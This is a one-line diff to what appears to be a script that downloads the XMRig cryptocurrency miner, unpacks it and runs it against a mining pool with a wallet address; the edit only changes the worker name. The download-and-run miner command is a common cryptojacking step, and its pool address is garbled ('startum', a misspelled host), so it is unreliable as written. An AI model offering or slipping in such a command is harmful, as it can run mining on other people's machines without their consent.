@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -xvf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig -o startum+tcp://randomxmenero.usanicehash.com:3380 -u 359JuZKUTATLBFzQy3Uu9LvjqQSUcR44ii .ST4RK --coin monero --nicehash
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -xvf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig -o startum+tcp://randomxmenero.usanicehash.com:3380 -u 359JuZKUTATLBFzQy3Uu9LvjqQSUcR44ii.Rig01 --coin monero --nicehash
